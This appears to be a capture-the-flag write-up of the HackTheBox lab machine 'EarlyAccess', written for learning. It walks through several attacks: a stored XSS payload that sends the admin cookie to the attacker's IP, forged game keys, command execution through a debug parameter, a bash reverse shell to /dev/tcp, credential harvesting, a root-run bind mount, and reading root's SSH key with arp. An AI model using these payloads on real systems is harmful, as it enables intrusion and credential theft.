---
title: "EarlyAccess"
date: 2022-02-12
type: docs
tags:
  - htb
  - linux
  - hard
  - stored-xss
  - laravel
  - api-abuse
  - game-key-bruteforce
  - php
  - debug-parameter
  - rce
  - docker
  - container-pivot
  - shared-mount
  - hashcat
  - capabilities
  - Medium
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 10, multi container), **Difficulty:** Medium in my notes, **officially Hard**, **Released:** 2022-02-12, **IP:** `10.10.11.110` , `earlyaccess.htb`

</div>

<div class="callout callout-warning">

**Partial**

My notes are recon plus the XSS payload and captured cookies. Everything after is reconstructed from published writeups (chr0x6eos, 0xdf, pencer) and marked. This box has a long chain across three containers.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Laravel game site. Register, then set your **username** to a stored XSS payload (the profile update skips the registration blacklist). Message the admin, steal `earlyaccess_session`.
2. As admin, the `/key` page talks to an internal `api:5000` that validates game keys with a `magic_num` that rotates every 30 minutes (range 346 to 405). Generate all 60 candidate keys and submit until one validates. A valid key unlocks **`dev.earlyaccess.htb`** (`admin : gameover`).
3. `dev` has `/actions/hash.php`, which takes `hash_function` and a `debug=true` flag. `hash_function=system` plus `password=<cmd>` is **RCE as `www-data`**.
4. `/home/www-adm/.wgetrc` leaks the API password. `api:5000/check_db` echoes the container env, which contains the MySQL creds `drew : XeoNu86JTznxMCQuGHrGutF3Csq5`. SSH as **`drew`** for `user.txt`.
5. `drew`'s `~/.ssh/id_rsa` is for `game-tester@game-server` (172.19.0.4). `/opt/docker-entrypoint.d/` on the web host is bind mounted into the game-server container and every script there runs as root at container start. Drop `chmod +s /bin/bash`, crash the game (`curl 127.0.0.1:9999/autoplay -d 'rounds=-1'`), the healthcheck restarts the container and runs your script. Root on the container.
6. Crack the `game-adm` `$6$` hash (`gamemaster`). `/usr/sbin/arp` has `cap_setuid` style empty capabilities, so `arp -v -f /root/.ssh/id_rsa` reads root's key. `ssh root@earlyaccess.htb`.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `dev.earlyaccess.htb` admin | `admin : gameover` |
| `.wgetrc` API creds | `api : s3CuR3_API_PW!` |
| MySQL / `drew` | `drew : XeoNu86JTznxMCQuGHrGutF3Csq5` |
| `game-adm` (cracked `$6$`) | `gamemaster` |
| `user.txt` | `/home/drew/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

EarlyAccess is a long multi container chain and it is officially a Hard box. The themes: **stored XSS aimed at an admin** (with a filter that only guards registration, not the profile edit), an **API you have to reverse just enough to forge a valid game key**, a **PHP `debug` parameter that turns a hashing helper into `call_user_func`**, and then a **Docker pivot** where a directory bind mounted from the web host into the game container runs its scripts as root. The last hop is a **capabilities** abuse (`arp` with file read as a privileged binary). It is a great box for practising "what container am I in, what is mounted, and what runs it".

Related stored XSS to admin: [Cat](/writeups/hackthebox/linux/medium/cat/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Usage](/writeups/hackthebox/linux/easy/usage/). Related PHP `call_user_func` / debug param RCE: unique here. Related container pivot via shared mount: [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/) is the reference. Related capabilities abuse: [Wifinetic](/writeups/hackthebox/linux/easy/wifinetic/) (`cap_net_raw`), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/) (`capsh`).

---

## Full Walkthrough

### Reconnaissance

```console
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp  open  http     Apache httpd 2.4.38 (Debian)   (redirects to https)
443/tcp open  ssl/http Apache httpd 2.4.38 (Debian)
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios
Service Info: Host: 172.18.0.102
```

<div class="callout callout-note">

**`Service Info: Host: 172.18.0.102`**

The web server sits in a Docker container on the `172.18.0.0/16` network. There will be more containers (a `db`, an `api`, and later a `game-server` on a different bridge). Note the internal IP whenever nmap leaks it.

</div>

### Stored XSS to admin

Register an account. Direct registration filters `<`, `>` in the username, but the **profile update** does not.

```
profile -> username = <script>document.location="http://10.10.14.7/?c="+document.cookie;</script>
```

Then open a support ticket / message to the admin. When the admin views it (their panel renders your username), the payload fires and ships `earlyaccess_session` to your listener. Set that cookie to become admin.

### Admin key generation, then dev.earlyaccess.htb

<div class="callout callout-note">

**The game key (reconstructed)**

`/key` submits to an internal `http://api:5000`. The validator computes `magic_num` from the current time (it changes every 30 minutes and lives in the range 346 to 405), and a key is `KEY<magic_num>-<blocks>` with a checksum. Since you cannot see `magic_num`, generate one key for **every** value 346..405 (60 keys) and POST each to `/key/add` until one is accepted. That key registers your account for the closed beta and unlocks `dev.earlyaccess.htb`, whose admin login is `admin : gameover`.

</div>

### RCE on dev via the hashing helper

`dev.earlyaccess.htb` has developer tools including `/actions/hash.php`:

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
Content-Type: application/x-www-form-urlencoded

action=hash&password=id&hash_function=system&debug=true
```

<div class="callout callout-note">

**Why this is RCE**

The endpoint does roughly `$result = $hash_function($password);` and only runs it when `debug` is set (a leftover dev toggle). `$hash_function` is meant to be `md5` / `sha1`, but it is not validated, so `hash_function=system` makes it `system($password)`. Set `debug=true` and you have command execution as `www-data`.

</div>

```
action=hash&password=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/443+0>%261'&hash_function=system&debug=true
```

### www-data to drew

```bash
cat /home/www-adm/.wgetrc
# user=api
# password=s3CuR3_API_PW!

wget -O- -q --user=api --password='s3CuR3_API_PW!' http://api:5000/check_db
# prints the api container env, including:
# MYSQL_USER=drew   MYSQL_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5
```

```bash
ssh drew@earlyaccess.htb        # XeoNu86JTznxMCQuGHrGutF3Csq5
cat user.txt
```

### drew to game-server to container root

`drew` has `~/.ssh/id_rsa` for `game-tester@game-server`. Find the container:

```bash
for i in $(seq 2 254); do ping -c1 -W1 172.19.0.$i &>/dev/null && echo up 172.19.0.$i; done
ssh -i ~/.ssh/id_rsa game-tester@172.19.0.4
```

<div class="callout callout-note">

**The bind mount privesc**

`/opt/docker-entrypoint.d/` on `earlyaccess.htb` (writable by `drew`) is bind mounted into the game-server container at `/docker-entrypoint.d/`, and the container's entrypoint runs every script there **as root** on each start. So from `drew`:
```bash
while true; do echo 'chmod +s /bin/bash' > /opt/docker-entrypoint.d/ex.sh; chmod +x /opt/docker-entrypoint.d/ex.sh; sleep 1; done
```
Then from `game-tester`, crash the node game so the healthcheck restarts the container:
```bash
curl 127.0.0.1:9999/autoplay -d 'rounds=-1'
```
After the restart, `/bin/bash -p` on the container is root.

</div>

### Container root to root on earlyaccess.htb

```bash
grep game-adm /etc/shadow
# $6$zbRQg.JO7dBWcZ$...
john hash --wordlist=rockyou.txt        # -> gamemaster
su game-adm
```

`/usr/sbin/arp` on the container has capabilities that let it read arbitrary files:

```bash
getcap /usr/sbin/arp        # = ep (or cap_dac_read_search)
/usr/sbin/arp -v -f /root/.ssh/id_rsa
# the key prints (with some parse-error noise); clean it up
```

Because `/root` is shared, that key is `root@earlyaccess.htb`:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@earlyaccess.htb
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/drew/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Blacklist input in one place, sanitise it everywhere.** The registration filter meant nothing because the profile edit skipped it.
- **`$variable_function($input)` is `call_user_func`.** Never let the callable name come from the request, and remove `debug` toggles before shipping.
- **Docker env vars are readable** from any process in the container and from `/proc`, and API "debug" endpoints that echo the environment hand attackers every secret.
- **Bind mounting a host directory that another user can write into a container that runs its contents as root is a cross privilege escalation.** Mount read only, or not at all.
- **`getcap -r /` on every host and container.** `cap_dac_read_search` / `cap_setuid` on a small tool is root.

---

## Related Writeups

- **Stored XSS to admin session:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **API abuse / reversing a validation scheme:** [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/)
- **Container pivot and shared mounts:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Analytics](/writeups/hackthebox/linux/easy/analytics/)
- **Linux capabilities abuse:** [Wifinetic](/writeups/hackthebox/linux/easy/wifinetic/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)

## References

- HTB EarlyAccess (chr0x6eos) <https://chr0x6eos.github.io/2022/02/12/htb-EarlyAccess.html>
- HTB EarlyAccess (0xdf) <https://0xdf.gitlab.io/2022/02/12/htb-earlyaccess.html>
- GTFOBins arp <https://gtfobins.github.io/gtfobins/arp/>
- PHP variable functions <https://www.php.net/manual/en/functions.variable-functions.php>
